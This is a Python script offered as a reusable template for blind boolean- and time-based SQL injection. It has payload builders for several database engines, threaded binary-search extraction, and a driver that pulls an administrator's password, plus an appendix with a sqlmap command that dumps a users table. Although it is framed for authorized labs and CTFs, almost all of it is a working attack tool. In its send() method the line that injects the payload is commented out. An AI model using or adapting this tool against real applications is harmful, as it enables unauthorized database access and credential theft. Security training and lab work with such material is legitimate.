``` pyhton 
#!/usr/bin/env python3
"""
================================================================================
 Blind / Boolean-Based SQL Injection Extractor — Reusable Template
================================================================================

PURPOSE
-------
A generic, reusable framework for extracting data via boolean-based blind
SQL injection, where the only signal you get back is a binary oracle
(e.g. "Welcome back!" appears vs. doesn't, HTTP 200 vs 302, response time
threshold, etc).

Intended for authorized security testing only — CTF labs (PortSwigger
Academy, HackTheBox, TryHackMe), your own applications, or engagements
you're explicitly authorized to test. Do not point this at systems you
don't have permission to test.

DESIGN
------
- All target-specific logic (how to send the payload, how to detect
  TRUE vs FALSE) lives in the `Oracle` class. Everything else is generic.
- Binary search is used everywhere it's applicable (length, each character's
  ASCII value) instead of linear brute force — this is the single biggest
  speed win (O(log n) requests per unknown value instead of O(n)).
- A thread pool extracts multiple character positions concurrently.
- A `Session` object (connection reuse) avoids repeated TCP/TLS handshakes.
- Structured to be adapted to MySQL / PostgreSQL / MSSQL / Oracle / SQLite
  by swapping the SQL snippets in the `Dialect` classes.

USAGE
-----
1. Fill in the `Oracle.send()` method with your actual request logic.
2. Pick the right `Dialect` for your target DBMS (or write your own).
3. Call `extract_string(...)` for any single value, or use the higher-level
   helpers to dump length + value for a column.

    python3 blind_sqli_extractor.py

================================================================================
"""

import string
import sys
import time
import concurrent.futures
from dataclasses import dataclass
from typing import Callable, Optional

import requests


# =============================================================================
# 1. DIALECTS — SQL snippets per database engine
# =============================================================================
# Each dialect exposes the same interface: given a boolean condition (already
# a fragment like "X <= Y"), wrap it into a full standalone TRUE/FALSE
# condition you can slot into the oracle payload template.
#
# These are kept as plain string-formatting helpers so you can see exactly
# what SQL is being built — no ORM magic to obscure the injection.

class MySQLDialect:
    name = "MySQL / MariaDB"

    @staticmethod
    def length_of(subquery: str) -> str:
        return f"LENGTH(({subquery}))"

    @staticmethod
    def ascii_char_at(subquery: str, pos: int) -> str:
        return f"ASCII(SUBSTRING(({subquery}),{pos},1))"

    @staticmethod
    def string_agg_count(subquery_table: str) -> str:
        return f"(SELECT COUNT(*) FROM ({subquery_table}) AS t)"


class PostgresDialect:
    name = "PostgreSQL"

    @staticmethod
    def length_of(subquery: str) -> str:
        return f"LENGTH(({subquery}))"

    @staticmethod
    def ascii_char_at(subquery: str, pos: int) -> str:
        return f"ASCII(SUBSTRING(({subquery}) FROM {pos} FOR 1))"


class MSSQLDialect:
    name = "Microsoft SQL Server"

    @staticmethod
    def length_of(subquery: str) -> str:
        return f"LEN(({subquery}))"

    @staticmethod
    def ascii_char_at(subquery: str, pos: int) -> str:
        return f"ASCII(SUBSTRING(({subquery}),{pos},1))"


class OracleDialect:
    name = "Oracle DB"

    @staticmethod
    def length_of(subquery: str) -> str:
        return f"LENGTH(({subquery}))"

    @staticmethod
    def ascii_char_at(subquery: str, pos: int) -> str:
        return f"ASCII(SUBSTR(({subquery}),{pos},1))"


# =============================================================================
# 2. ORACLE — target-specific transport + TRUE/FALSE detection
# =============================================================================
# This is the ONLY part you should need to rewrite per-target.
# Fill in `send()` with how your injection point actually works
# (cookie, GET param, POST body, header, JSON field, etc.)
# and `is_true()` with how you distinguish TRUE from FALSE responses.

@dataclass
class OracleConfig:
    base_url: str
    # Static/base value the injectable parameter starts with, if any
    # (e.g. a legitimate tracking ID prefix, a valid-looking session token)
    injection_prefix: str = ""
    # Comment sequence for your DB dialect: "--" (MySQL/MSSQL, needs trailing
    # space or newline), "-- " , "#" (MySQL), or omit and close the quote
    # yourself if not needed.
    comment_seq: str = "-- "
    timeout: float = 10.0
    # Optional: extra static cookies/headers/params needed for every request
    extra_cookies: Optional[dict] = None
    extra_headers: Optional[dict] = None


class Oracle:
    """
    Wraps the HTTP transport and TRUE/FALSE decision logic.
    Adapt `send()` and `is_true()` to your specific injection point.
    """

    def __init__(self, config: OracleConfig):
        self.config = config
        self.session = requests.Session()
        self.requests_sent = 0

    def build_payload(self, condition: str) -> str:
        """
        Wraps a raw boolean condition into the injection payload.
        Adjust quoting/closing to match your injection context
        (string context needs a leading `'`, numeric context might not).
        """
        return f"' AND ({condition}){self.config.comment_seq}"

    def send(self, condition: str) -> requests.Response:
        """
        >>> ADAPT THIS METHOD TO YOUR TARGET <<<

        Example shown: injecting via a cookie value (as in the PortSwigger
        "SQL injection with filter bypass via XML encoding" / blind-in-
        cookie style labs). Swap for params=, data=, json=, headers=
        as needed.
        """
        payload = self.build_payload(condition)
        cookies = {**(self.config.extra_cookies or {})}
        # Example: appending payload onto a known cookie value
        # cookies['TrackingId'] = self.config.injection_prefix + payload

        self.requests_sent += 1
        return self.session.get(
            self.config.base_url,
            cookies=cookies,
            headers=self.config.extra_headers,
            timeout=self.config.timeout,
        )

    def is_true(self, response: requests.Response) -> bool:
        """
        >>> ADAPT THIS METHOD TO YOUR TARGET <<<

        Common signals:
          - a string that only appears on the TRUE branch
            e.g. "Welcome back!" in response.text
          - status code differs (200 vs 302, 200 vs 500)
          - response length differs beyond a threshold
          - (for time-based blind) response time exceeds a delay you injected
        """
        return "Welcome back" in response.text

    def test(self, condition: str) -> bool:
        return self.is_true(self.send(condition))


# =============================================================================
# 3. TIME-BASED ORACLE VARIANT (use when no content/status signal exists)
# =============================================================================

class TimeBasedOracle(Oracle):
    """
    For fully blind injections with no observable TRUE/FALSE difference,
    fall back to time delays. Slower and noisier — prefer the content/status
    oracle above whenever any observable difference exists.
    """

    def __init__(self, config: OracleConfig, delay_seconds: int = 5,
                 dbms: str = "mysql"):
        super().__init__(config)
        self.delay_seconds = delay_seconds
        self.dbms = dbms

    def build_payload(self, condition: str) -> str:
        if self.dbms == "mysql":
            delayed = f"IF(({condition}),SLEEP({self.delay_seconds}),0)"
        elif self.dbms == "postgres":
            delayed = (f"CASE WHEN ({condition}) THEN "
                       f"pg_sleep({self.delay_seconds}) ELSE pg_sleep(0) END")
        elif self.dbms == "mssql":
            delayed = (f"IF ({condition}) WAITFOR DELAY "
                       f"'0:0:{self.delay_seconds}'")
        else:
            raise ValueError(f"Unsupported dbms for time-based: {self.dbms}")
        return f"'; SELECT {delayed}{self.config.comment_seq}"

    def is_true(self, response: requests.Response) -> bool:
        return response.elapsed.total_seconds() >= self.delay_seconds * 0.9

    def test(self, condition: str) -> bool:
        start = time.time()
        resp = self.send(condition)
        elapsed = time.time() - start
        return elapsed >= self.delay_seconds * 0.9


# =============================================================================
# 4. GENERIC EXTRACTION ENGINE — binary search + threading
# =============================================================================

class BlindExtractor:
    def __init__(self, oracle: Oracle, dialect=MySQLDialect,
                 max_workers: int = 8, verbose: bool = True):
        self.oracle = oracle
        self.dialect = dialect
        self.max_workers = max_workers
        self.verbose = verbose

    def _log(self, msg: str, end="\n"):
        if self.verbose:
            sys.stdout.write(msg + end)
            sys.stdout.flush()

    # -- Length discovery via binary search -----------------------------
    def get_length(self, subquery: str, max_len: int = 200) -> int:
        expr = self.dialect.length_of(subquery)
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.test(f"{expr}<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        self._log(f"[+] Length resolved: {lo}")
        return lo

    # -- Single character via binary search over ASCII range ------------
    def get_char_at(self, subquery: str, pos: int,
                     lo: int = 32, hi: int = 126) -> str:
        expr = self.dialect.ascii_char_at(subquery, pos)
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.test(f"{expr}<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        return chr(lo)

    # -- Full string extraction, length + all characters (threaded) -----
    def extract_string(self, subquery: str, known_length: Optional[int] = None) -> str:
        length = known_length or self.get_length(subquery)
        if length == 0:
            return ""

        chars = [None] * length
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {
                ex.submit(self.get_char_at, subquery, i + 1): i
                for i in range(length)
            }
            for fut in concurrent.futures.as_completed(futures):
                idx = futures[fut]
                chars[idx] = fut.result()
                self._log(f"\r[+] {''.join(c or '_' for c in chars)}", end="")

        self._log("")  # newline after progress display
        return "".join(chars)

    # -- Row count helper (useful before dumping a table) ----------------
    def get_row_count(self, table_subquery: str) -> int:
        expr = f"(SELECT COUNT(*) FROM {table_subquery})"
        lo, hi = 0, 10_000
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.test(f"{expr}<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        return lo


# =============================================================================
# 5. EXAMPLE DRIVER — adapt the target details and run
# =============================================================================

def main():
    config = OracleConfig(
        base_url="https://YOUR-LAB-ID.web-security-academy.net/login",
        injection_prefix="YOUR_BASE_TRACKING_ID_VALUE",
        comment_seq="-- ",
        extra_cookies={"session": "YOUR_SESSION_COOKIE_VALUE"},
    )

    oracle = Oracle(config)
    extractor = BlindExtractor(oracle, dialect=MySQLDialect, max_workers=8)

    target_column = "SELECT password FROM users WHERE username='administrator'"

    print(f"[*] Dialect: {MySQLDialect.name}")
    print(f"[*] Target : {target_column}")
    print("[*] Extracting...")

    result = extractor.extract_string(target_column)

    print(f"\n[+] Extracted value: {result}")
    print(f"[+] Total requests sent: {oracle.requests_sent}")


if __name__ == "__main__":
    main()


# =============================================================================
# APPENDIX: WHEN TO REACH FOR OTHER TOOLS INSTEAD
# =============================================================================
"""
This template is meant for learning the mechanics of blind SQLi, or for
edge cases where you need custom logic sqlmap doesn't easily express
(unusual encoding, WAF-specific payload mutation, chained multi-step
requests to reach the injectable parameter). For day-to-day testing,
these will usually be faster and more robust:

  sqlmap
  ------
  Automates everything this script does (and much more: fingerprinting,
  enumeration, dumping, OS shell in some cases).
    sqlmap -u "https://target/login" \\
      --cookie="TrackingId=BASE_VALUE*; session=SESSION" \\
      -p TrackingId --technique=B --dbms=mysql \\
      --dump -T users

  Burp Suite — Turbo Intruder
  ----------------------------
  Best when you need high request throughput with custom Python logic
  inside Burp itself (keeps you in the same tool as your recon/proxy
  history). Ships example scripts for exactly this binary-search
  extraction pattern.

  Burp Suite — Intruder (Cluster bomb / Sniper)
  ----------------------------------------------
  Fine for small, one-off boolean checks or manual confirmation before
  scripting a full extraction.

  ffuf / wfuzz
  ------------
  Useful if your oracle signal is response-length or status-code based
  and you want a quick CLI differential without writing Python.
"""
